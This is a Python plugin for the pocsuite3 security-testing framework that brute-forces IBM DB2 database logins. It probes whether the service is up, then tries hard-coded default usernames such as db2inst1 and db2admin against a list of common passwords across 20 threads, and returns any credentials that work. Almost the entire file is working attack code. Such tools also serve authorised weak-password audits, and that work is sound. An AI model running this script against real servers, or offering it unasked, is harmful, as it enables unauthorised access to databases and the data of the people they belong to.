# -*- coding: utf-8 -*-
# author: seven
from pocsuite3.api import register_poc, POCBase, Output,logger,POC_CATEGORY
from pocsuite3.lib.core.threads import run_threads
import itertools
import queue
import ibm_db

db2_username = ['db2admin','db2inst1','db2fenc1','dasusr1']
db2_password = ['123456','db2inst1','db2admin','password','12345','test','guest','12345678']
def check_alive(host,port):
    connstr=f"database=TESTDB222;querytimeout=6;connecttimeout=6;hostname={host};port={port};protocol=tcpip;uid=db2inst1211;pwd=123456123123;"
    try:
        conn=ibm_db.connect(connstr,"","")
        return True
    except Exception as e:
        if 'TESTDB222' in str(e):
            return True
        else:
            logger.info(f'{host}:{port}\t{str(e)}')
    logger.info(f'{host}:{port}\t db2 not alive')
    return False

def db2_login(host,port,username,password):
    connstr=f"attach=true;querytimeout=6;connecttimeout=6;HOSTNAME={host};PORT={port};PROTOCOL=TCPIP;UID={username};PWD={password};"
    conn = None
    try:
        conn=ibm_db.connect(connstr,"","")
        return True
    except Exception as e:
        logger.info(f'{host}:{port} login fail with {username}/{password}\t{str(e)}')
    finally:
        if conn:
            ibm_db.close(conn)
    return False
class DB2WeakpassPOC(POCBase):
    vulID = ''
    version = '1.0'
    author = ['seven']
    vulDate = 'Aug 2, 2020'
    createDate = 'Aug 2, 2020'
    name = 'db2数据库弱口令'
    appName = 'db2'
    appVersion = 'v1.0.0'
    vulType = 'weakpass'
    protocol = 'db2'

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output
    def _verify(self):
        host = self.getg_option("rhost")
        port = self.getg_option("rport") or 50000

        result = {}
        
        db2_burst(host,port)

        if not result_queue.empty():
            username, password = result_queue.get()
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url
            result['VerifyInfo']['Username'] = username
            result['VerifyInfo']['Password'] = password
            result['extra'] = username+':'+password
        return self.parse_output(result)
    def _attack(self):
        return self._verify()

task_queue = queue.Queue()
result_queue = queue.Queue()


def get_word_list():
    return itertools.product(db2_username,db2_password)

def task_init(host, port):
    for username, password in get_word_list():
        task_queue.put((host, port, username.strip(), password.strip()))

def task_thread():
    while not task_queue.empty():
        host, port, username, password = task_queue.get()
        logger.info('try burst {}:{} use username:{} password:{}'.format(
            host, port, username, password))
        if db2_login(host, port, username, password):
            with task_queue.mutex:
                task_queue.queue.clear()
            result_queue.put((username, password))

def db2_burst(host,port):
    if not check_alive(host,port):
        return
    try:
        task_init(host,port)
        run_threads(20,task_thread)
    except:
        pass


register_poc(DB2WeakpassPOC)


